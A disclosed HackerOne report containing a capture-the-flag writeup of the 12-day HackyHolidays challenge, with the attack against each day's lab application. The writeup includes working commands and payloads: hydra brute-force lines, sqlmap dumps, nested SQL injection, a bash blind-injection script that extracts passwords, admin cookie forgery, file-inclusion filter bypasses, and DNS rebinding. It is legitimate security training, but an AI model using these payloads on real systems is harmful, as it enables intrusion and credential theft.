# HackyHolidays H1 CTF Writeup

## Report Details
- **Report ID**: 1068881
- **URL**: https://hackerone.com/reports/1068881
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-12-30T17:23:11.206Z
- **Disclosed**: 2021-01-11T22:05:05.943Z

## Reporter
- **Username**: mava
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
#HackyHolidays
##Day 1 
Once the CTF started and the Grinch released the scope `hackyholidays.h1ctf.com`, I started the CTF by a good old Nmap scan,
to see whats running on the server. So the nmap command looked like `nmap -sC -sV -oA nmap hackyholidays.h1ctf.com/`.
The result showed a promising entry regarding the `robots.txt`:  
```
Found Entry:
|  Supported Methods: GET HEAD POST
|  http-robots.txt: 1 disallowed entry
|  /s3cr3t-ar3a
```
So to check it out, I visited: [https://hackyholidays.h1ctf.com/robots.txt](https://hackyholidays.h1ctf.com/robots.txt).
The `robots.txt` revealed the the hidden directory [https://hackyholidays.h1ctf.com/s3cr3t-ar3a](https://hackyholidays.h1ctf.com/s3cr3t-ar3a) for the next day and the first Flag: `flag{48104912-28b0-494a-9995-a203d1e261e7}`
##Day 2
Once the page [https://hackyholidays.h1ctf.com/s3cr3t-ar3a](https://hackyholidays.h1ctf.com/s3cr3t-ar3a) for the second day went live, only a warning was displayed:   
{F1137420}   
So I pressed F12 to open the developer-console for my browser.
Maybe the Grinch was hidding something as a comment in the HTML or Javascript. And I was right, after a quick look I found another directory [https://hackyholidays.h1ctf.com/apps](https://hackyholidays.h1ctf.com/apps) and the Flag `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`:   
{F1137431}
##Day 3 - The People Rater
So it seems like the Grinch rates the poeples he hates the most on a list:  
{F1137435}
So we start to explore the app by clicking on one of the name.
This reveals us the rating for the person. If we have a look in Burp, of what requests are made  
{F1137439}  
we can see that a Base64 string is part of the parameter  like`id=eyJpZCI6Mn0=`. If we decode that param of the first entry, it reveals `{"id":2}`. 
So we notice, that the `Id` of the first entry starts with 2 and not with a 1. So if we change the `Id`to 1 and encode that data again with Base64,
we get a new entry like [https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=](https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=). This entry reveals us the flag for the day `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`.
And of course, like I allready knew, the Grinch is "Amazing in every possible way!". More on that later.  
{F1137443}
##Day 4 - Swag Shop
At Day 4 the Grinch started a new Swag Shop  
{F1137448}
and our job is it, to get the personal data of the grinch.
Do get a better understanding for the Swag Shop, I started to enumerate the application by useing all of its functions.
So after looking at a few request, I discorvered the following url: `https://hackyholidays.h1ctf.com/swag-shop/api/login`.
So there is an API to poke around with. I first tried some default/weak credentials on the login, like admin:admin etc. but that didn't worked out.
After that I tried to enumerate the API a bit more, so I spun up ffuf and fuzzed the API like: `ffuf -w /Wordlists/SecLists/Discovery/Web-Content/api/objects.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ`
This gave me two new endpoints `/sessions` and `/user`. So let's take a look at [https://hackyholidays.h1ctf.com/swag-shop/api/sessions](https://hackyholidays.h1ctf.com/swag-shop/api/sessions) and see what we get:  
{F1137453}
```
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0="
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0="
"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ=="
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0="
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0="
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0="
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0="
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
```
It looks like we get the sessions of all users as base64 string. If we look closer, you can see that one entry is quite longer then all other entries.
```
"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ=="
```
If we base64 decode that entry, we get the following data:
```
"{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}"
```
We get a json object of a session for the user `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`. 
If we decode the base64 cookie value we get a SHA-512 hash, so no luck with that value.
So let's have a look at the other `/user` endpoint [https://hackyholidays.h1ctf.com/swag-shop/api/user](https://hackyholidays.h1ctf.com/swag-shop/api/user).
`"error": "Missing required fields"`.  
{F1137455}  
This looks like we are missing a required paramter to fetch the information for a user. So lets fireup Arjun to discover what parameter we are missing:
`python3 arjun.py -u https://hackyholidays.h1ctf.com/swag-shop/api/user` reveals the following:  
{F1137457}
So it looks like the parameter `uuid`is missing. But we allready found the user ID `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`, so let's add
that value as `uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043`, [https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043](https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043). That worked and we get the flag `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`.  
{F1137462}
##Day 5 - Secure Login
The Grinch added a new secure login [https://hackyholidays.h1ctf.com/secure-login](https://hackyholidays.h1ctf.com/secure-login) to his apps.  
{F1137465}  
After trying a few username/password combinations. I noticed, that the error message for a wrong login indicated a Brute Force Attack,
by only stating that the Username was invalid and not the username/password combination!  
{F1137468}
So I spun up hydra to brute force the username:
```
hydra -L /Wordlists/SecLists/Usernames/Names/names.txt -p test hackyholidays.h1ctf.com http-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Username"
```
That revelead `access`as a username, same procedure for the password:  
```
hydra -l access -P /Wordlists/SecLists/Passwords/xato-net-10-million-passwords-100.txt hackyholidays.h1ctf.com http-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Password"
```
After that we have the valid credentials `access:computer` and can login.  
{F1137526}  
"No Files To Download" was not the flag I was hoping for, so what went wrong?  
I looked around and found a new cookie!  
`securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D` 
If we decode that Base64 string we get: `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":falsZX0%3D` that seems to be a broken cookie. 
So let's change it to: `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true"}` encode back to bas64 and set the cookie value to `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==`,  after that save it and refresh the site.  
{F1137549}
OH, we got a new file to download!
If we try to open the zipfile it asks us for a password, so let's use bruteforce again. This time we will use fcrackzip and rockyou.txt:
```
fcrackzip -u -D -p rockyou.txt my_secure_files_not_for_you.zip
```
Success!! We get the password `hahahaha`. Well,  nice password!
If we take a look at the files we see flag.txt containing the flag:
{F1137560}
`flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}` and we get a nice selfie of my friend!  
{F1137561} 
##Day 6 - My Diary
This time my friend launched a new diary [https://hackyholidays.h1ctf.com/my-diary](https://hackyholidays.h1ctf.com/my-diary) and we must figure out what is upcoming secret event is.  
So let's take a look:  
{F1137565}  
It's a calendar but the interesting part can be observed in the url: `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html`  
The template includes a HTML file, so maybe we can use that to include another local file. So I tried some common files like index.html and index.php.
That worked!!
[https://hackyholidays.h1ctf.com/my-diary/?template=index.php](https://hackyholidays.h1ctf.com/my-diary/?template=index.php) is working.
And even if it's a blank page, we can see the file useing the inspector.  
{F1137574}  
After a quick look, we see that`admin.php`was renamed to `secretadmin.php` and that the filename was kind of blacklisted.  
The `str_replace("xxx","",$page) replaces `xxx` inside the filename (`$page`) with nothing `""`, so `adminxxx.php` will become `admin.php` after the string replace. We can chain all replace togehter from bottom to top, to add all parts which will be removed so that we end up with `secretadmin.php` inside `$page`. After doing so we get the filename `secretadmsecretadmadmin.phpin.phpin.php` which we can use as the template:  
[https://hackyholidays.h1ctf.com/my-diary/?template=secretadmsecretadmadmin.phpin.phpin.php](https://hackyholidays.h1ctf.com/my-diary/?template=secretadmsecretadmadmin.phpin.phpin.php) this redirects us to the `secretadmin.php` file revealing the flag and the DOS event:  
{F1137581}
`flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`  
##Day 7 - Hate Mail
New day new challenge! My buddy set up a Hate Mail campaign to ruin christmas.  
{F1137585}  
Ok we can choose a campaign and add a new one. So let's add a new one.  
Adding a new one won't work because we have no credits.  
{F1137595}  
But we can preview it.  
{F1137598}  
Here we can observe something interesting `{{name}}` get replaced by `Alice` so this is some kind of templating going on.  
If we look at the request in Burp, we can see what's going on.  
{F1137603}  
`preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D` is a hidden url encoded value 
and contais the name Alice: `{"name":"Alice","email":"alice@test.com"}`.  
That could come in handy later, let's have a look at the allready existing campaign.  
{F1137610}  
This looks also interesting, as we can see the same kind of templating, but we see it's including some kind of files `template:cbdj3_grinch_header.html`.
It looks like `template` is a folder so maybe we can fetch it via the url [https://hackyholidays.h1ctf.com/hate-mail-generator/template/](https://hackyholidays.h1ctf.com/hate-mail-generator/template/) does not work. But maybe a single template is placed inside a `templates`folder.  
[https://hackyholidays.h1ctf.com/hate-mail-generator/templates/](https://hackyholidays.h1ctf.com/hate-mail-generator/templates/) That worked!  
{F1137614}  
`38dhs_admins_only_header.html` looks interesting, we even can see that it has some content, but if we try to access it directly we get a 403 Forbidden.  
So maybe we can include it inside the preview feature!!  
I tried multiple thinks like including it in the markup like:  
```
Hello ...{{template:38dhs_admins_only_header.html}}
```
But that didn't worked out. But we discovered the hidden value, so maybe we can try that to get the content, so i placed the file inside the name value like:  
```
preview_markup=Hello {{name}}+....&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```
Success!!  
{F1137633}
`flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`
## Day 8 - Forum 
Until that day my alliance with the Grinch was a little secret. But he made the forum public.  
The application is a simple forum and if we enumerate it, we can see that I have an account and that I'm chatting with my buddy:  
{F1137636}  
But I forgot my password. So I asked Adam if he got send me the credentials:  
{F1137640}  
Adam must have made a mistake, because the password `hunter2` was invalid. I'm sure it was a mistake!!  
Since that didn't worked I started ffuf again:  
```
ffuf -w ./Wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u https://hackyholidays.h1ctf.com/forum/FUZZ
```
That revealed `/phpmyadmin`, so we have a phpmyadmin running, but also no luck with default credentials etc.. 
At that point I tried a lot of recon stuff but nothing worked. After a little hint I tried GitHub recon and found the following:  
[https://github.com/search?q=grinch-networks+in%3Aname&type=repositories](https://github.com/search?q=grinch-networks+in%3Aname&type=repositories)  
That [https://github.com/Grinch-Networks/forum](https://github.com/Grinch-Networks/forum) is the sourcecode of the application commited by Adam. After looking through the sourcecode for a while I found nothing, so I looked at the history of what was changed!  
[https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae#diff-998930400b08c30f6949f365207fd1d0c693d22ae5de6b9de752ef5c57ce9754](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae#diff-998930400b08c30f6949f365207fd1d0c693d22ae5de6b9de752ef5c57ce9754)    
That looks like some DB credentials `forum:6HgeAZ0qC9T6CQIqJpD`  
Since we have some DB credentials and a db management application, it's worth a try. So I tried the credentials for the phpmyadmin app and it worked.  
{F1137665}  
`35D652126CA1706B59DB02C93E0C9FBF` That looks like an MD5 hash, so I tried to crack it.  
{F1137668}  
That also worked, so now we got the password for grinch, we have valid credentials `grinch:BahHumbug` and can log in as grinch.  
{F1137670}  
That's it, we got the it: `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`  
##Day 9 - Evil Quiz  
The next challenge involves a new quiz app.  
{F1137679}  
After poking around the quiz for a while. I noticed a strange behaviour, if you enter `' or ''='` as your name:  
{F1137682}
"There is 1218463 other player(s) with the same name as you!" This clearly indicates a SQL-Injection vulnerability as the value of name matches all entries.
So I spun up SQLMap, but we got a problem, the "output" is visible on the page [https://hackyholidays.h1ctf.com/evil-quiz/score](https://hackyholidays.h1ctf.com/evil-quiz/score) but the name gets entered on page [https://hackyholidays.h1ctf.com/evil-quiz](https://hackyholidays.h1ctf.com/evil-quiz). So "Input" and "Ouput" are on two different pages, so we need to tell sqlmap where the output is visible.  
I read the sqlmap manual a bit and learned about "Second Order Injection" what is exactly what we need and luckly sqlmap can do that:  
```
python3 sqlmap.py -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=max" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=d3f362eca131d230fd92a5831b6311f0" --dump-all
```  
After a while I got the credentials:  
{F1137709}  
`admin:S3creT_p4ssw0rd-$` so login as admin and get the flag:  
{F1137712}  
`flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`  
##Day 10 - Signup Manager  
This application let's us create a user:  
{F1137725}  
Once we create a new account, we only see the "User Area", so  how can we see the "Admin Area"?  
If we look at a request a bit closer in Burp we will notice a comment.  
{F1137726}  
"See README.md" after that I looked at [https://hackyholidays.h1ctf.com/signup-manager/README.md](https://hackyholidays.h1ctf.com/signup-manager/README.md) which will download the readme markdown file.  
{F1137727}  
From the markdown file we know that the file `signupmanager.zip`, that all admin are stored in `users.txt` with the last character beeing an `Y` and the default credentials are `admin:password`. But of course the default credentials don't work. So let's look at the file [https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip](https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip)  
Once the file is downloaded we got the sourcecode of the application.  The most interesting file is `index.php`.  
To solve the challenge we need to take a closer look at `function buildUsers()` and `function addUser()`:  
{F1137729}  
So now we can see how these two function work together. Inside the buildUser function we can see that the user is an admin, if he has an `Y` at the place 112 inside the `$user_str`. The `$user_str` output of the addUser function. But we also see that we can't just spam a long `YYYYYYYY` string in the form, because `$substr()`is used on all parameters to cut them off if the exceed a specific length. Also substring is called at the end of the addUser function for the same purpose. So addUser produces a string like `userName_15LengthPasswordMD5_32LengthAge_3LengthFirstname_15LengthLastName_15LengthN` pay attaion to the `N`at the end as it's the position where a `Y`must be to make the user an admin. So we need to extend/blow up the `$usr_str` so we can put an `Y` of the lastname on the position where normaly the `N` would be.  After a while a friend of mine found out the you could use Burp to set `age` to the value `1e6` this is a scientific notation of an integer and the `intval`function will turn it into `1000000` thereby extending the userstring.  
So if we can build a new request with Burp like:  
{F1137789}  
Which will give us a new token for the newly created account. If we refresh the site, we will get the flag and the path for the next challenge:
{F1137790}  
`flag{99309f0f-1752-44a5-af1e-a03e4150757d}`  
[https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59)  
##Day 11 - The rise of the Grincharmy!
This challenge was the hardest in my opinion, but also the Grincharmy evolved out of it.  
{F1137796} {F1137797}  
This application was kind of an album. I enumerated a lot and just very little:  
- There is a strange 6 character hash per album like: `album?hash=jdh34k`
- A picture is referenced inside a Base64 string like: `picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9`  
once decoded you get: `{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}` That the location of the file and an MD5 Hash.
- The small hash param is vulnerable to SQL-Injection and you can dump the database, but this gives you no new information.
- There is an API [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api) but no matter what endpoint you try, like [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/test](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/test) you get an error message `"error": "This endpoint cannot be visited from this IP address`.   
  
That was it for quite a while, also an official hint was droped. A picture from the movie Inception. It's about a Dream inside a Dream inside a Dream.  
With some help a friend and me figured out, that it is an double nested UNION SQL-Injection attack like:  
`GET /r3c0n_server_4fdk59/album?hash=-4685' UNION ALL SELECT "1' UNION ALL SELECT \"1\",\"4\",\"/api/\"-- -","1","2" -- - // `  
I found a blog post which explains it alot better then I possibly can: [https://coderwall.com/p/dnf8sa/nested-sql-injections](https://coderwall.com/p/dnf8sa/nested-sql-injections)  
If you send the request above and inspect the broken image, you will find something like:  
`https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/PS5qcGciLCJhdXRoIjoiMGQyMDBlYmQxYTI3N2IxMTViYWI5MTEwMDc2NzcxMjIifQ==`  
This can be decoded to: `{"image":"r3c0n_server_4fdk59/uploads/../api/user? =.jpg","auth":"0d200ebd1a277b115bab911007677122"}` thereby bypassing the authentication of the md5. After that discovery I was invited to a discord channel where @bendtheory, @chron0x1, @chron0x, @\_d3f4u17\_,  @h3x0ne, @Panya and myself tried to figure out how to exploit this crazy SQL-Injection.  
We soon figured out, that we could you it to enumerate the API. If we would hit a valid endpoit it woudl show "Expected HTTP status 200, Received: 0" 
So it was also some HTTP Status Code based SQL-Injection.  
After a while we found `/api/user` needed the `param` and `password` and @h3x0ne came up with a bash script to exfiltrate the username/password.  
```
#!/bin/bash

set -ex

HOST=https://hackyholidays.h1ctf.com
URI=/evil-quiz


#echo "obtaining session and storing ... "
#curl --cookie-jar cookies.txt $HOST$URI


while read p; do

  echo "User : $p"

  #query="somethingThatDoesntExist' union select null,null,null,null from information_schema.columns where table_schema = 'quiz' and table_name = 'admin' and substr(data_type, 1, 1) = 'varchar' and column_name = 'password' -- "
  query="somethingThatDoesntExist' union select null,null,null,null FROM quiz.admin where BINARY substr(password, 1, 1) = '$p' and username = 'admin' -- "

  RDIR1=$(curl -si --cookie "session=<yourSession>" $HOST$URI --data-raw "name=$query" | grep -oP "Location: \K.*")

  echo "$RDIR1"

  #RDIR2=$(curl -si -b cookies.txt "$HOST/evil-quiz/start" --data-raw "ques_1=3&ques_2=3&ques_3=3" | grep -oP "Location: \K.*")

  #echo "$RDIR2"

  echo $(curl -si  --cookie "session=session=<yourSession>"  "$HOST/evil-quiz/score" | egrep -i '<div style="margin-top:20px">.*</div>')
  #echo $(curl -si -b cookies.txt  "$HOST/evil-quiz/score")
done < keys.txt**
**
```
After the script was running for like 30 minutes we finally had the credentials `grinchadmin:s4nt4sucks`. So log into the attack-box:  
{F1137891}  
`flag{07a03135-9778-4dee-a83c-7ec330728e72}`  
After we obtained the flag, we cheered in the discord and renaimed our little group to "Grincharmy". We all agreed it was an awesome challenge and that we must keep collaboration going for the next challenge. So once again Thanks and Kudos to the Grincharmy.  
##Day 12 - The final challenge
The final challenge started where the last one stoped, at the attack-box [https://hackyholidays.h1ctf.com/attack-box](https://hackyholidays.h1ctf.com/attack-box)  
{F1137908}  
This application launches some DOS attacks, once you click on a target, the url looks like: `https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==`
Once decoded: `{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}`  So we get the target which we attack and ANOTHER hash, nice! Like expected if we change the target but not the hash, the attack does not fire. After enumerating and fuzzing for a while, we didn't found anything new, so it must be some attack on the hash. Maybe we could use hashcat to crack the md5 and get the salt used for hashing.  
{F1137970}  
So we have the hashes and know that the IPs must be a part of it, so we can use `-m 10` with hashcat to crack it:  
```
hashcat -m 10 -a 0 hash.txt rockyou.txt
```  
{F1138020}  
The salt is `mrgrinch463`. So now we can use the salt to create our own md5 hashes like `md5(mrgrinch463127.0.0.1)` to make a valid hash for the local host. The we update the payload like `{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}` if we encode it as bas64 we get a new payload like: [https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFj
YjQ2MGIifQo=](https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFj
YjQ2MGIifQo=)  
{F1138042}  
But the attack is aborted as the localhost is detected. So the Grincharmy came up with a solution DNS-Rebinding.
If you craft a link DNS-Rebind link to the localhost like: `make-1-2-3-4-and-127.0.0.1-rr.1u.ms` and do the whole process of md5 hash and adjusting payload for it again you will end up with the following link: [https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJtYWtlLTEtMi0zLTQtYW5kLTEyNy4wLjAuMS1yci4xdS5tcyIsImhhc2giOiJm
ZGU5M2NlZmI5MGU1NDVjYjY1ODVhNDdiNTkzNDY2YiJ9Cg==](https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJtYWtlLTEtMi0zLTQtYW5kLTEyNy4wLjAuMS1yci4xdS5tcyIsImhhc2giOiJm
ZGU5M2NlZmI5MGU1NDVjYjY1ODVhNDdiNTkzNDY2YiJ9Cg==)  
Launch  the attack two times:  
{F1138057}  
It's attack the localhost and after a short period of time, you will be redirected to:  
{F1138059}  
`flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`  
It's done the Grinch-Networks is destroyed and the CTF is completed!!  
Thanks to the Grincharmy and thanks to Adam Langley and everybody involved in the CTF, was real fun!  

Best Regards  
Max  
(A close friend of the Grinch )

## Impact

An Attacker is able to use multiple attacks and vulnerabilities to take the Grinch-Networks offline.

## Attachments
- day2.png
- day2.2.png
- day3.1.png
- day3.2.png
- day3.2.png
- day3.3.png
- day4.1.png
- day4.2.png
- day4.3.png
- day4.4.png
- day4.5.png
- day5.1.png
- day5.2.png
- day5.3.png
- day5.4.png
- day5.5.png
- xxx.png
- day6.1.png
- day6.2.png
- day6.3.png
- day7.1.png
- day7.2.png
- day7.3.png
- day7.4.png
- day7.5.png
- day7.6.png
- day7.7.png
- day8.1.png
- day8.2.png
- day8.3.png
- day8.4.png
- day8.5.png
- day9.1.png
- day9.2.png
- day9.3.png
- day9.4.png
- day10.1.png
- day10.2.png
- day10.3.png
- day10.4.png
- day10.5.png
- day10.6.png
- day11.1.png
- day11.2.png
- day11.3.png
- day12.1.png
- day12.2.png
- day12.3.png
- day12.4.png
- day12.5.png
- day12.6.png
